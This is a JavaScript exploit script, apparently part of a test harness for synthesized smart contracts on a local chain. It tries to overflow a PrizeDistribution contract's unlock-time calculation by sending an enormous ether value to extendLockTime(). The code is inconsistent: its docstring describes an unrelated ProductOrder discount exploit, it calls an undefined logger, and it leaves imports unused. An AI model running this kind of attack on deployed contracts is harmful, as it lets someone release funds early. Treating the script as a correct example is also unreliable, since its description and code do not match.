require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');
// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'PrizeDistribution-16.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);


/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    try {
        let { abi } = await compileWithVersion(source, contractFileFullName, 'PrizeDistribution', solcVersion);
        let contractInstance = new web3.eth.Contract(abi, contractAddress);
        let organizerAccount = envInfo.accounts[0];  // Assuming this account is the organizer's

        console.log("Attempting to cause an integer overflow to manipulate unlock time...");

        // Send an amount that is likely to cause the unlock time calculation to overflow
        let largeAmountToSend = web3.utils.toWei('115792089237316195423570985008687907853269984665640564039457', 'ether');

        await contractInstance.methods.extendLockTime().send({
            from: organizerAccount,
            value: largeAmountToSend,
            gas: 300000
        });
        await sleep(200);

        // Check the updated unlock time to see if it has overflowed and wrapped around
        let newUnlockTime = await contractInstance.methods.unlockTime().call();
        let currentTime = Math.floor(Date.now() / 1000);

        console.log(`Updated unlock time after sending large amount: ${new Date(newUnlockTime * 1000).toString()}, Current time: ${new Date(currentTime * 1000).toString()}`);

        if (newUnlockTime < currentTime) {
            console.log("Integer overflow exploited successfully: Unlock time has been reduced to a past timestamp.");
            return true; // Exploit successful
        } else {
            console.error("Failed to cause integer overflow; unlock time not reduced as expected.");
            return false; // Exploit failed
        }
    } catch ( error) {
        console.error("An error occurred during the exploit attempt:", error);
        return false;
    }
}














/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
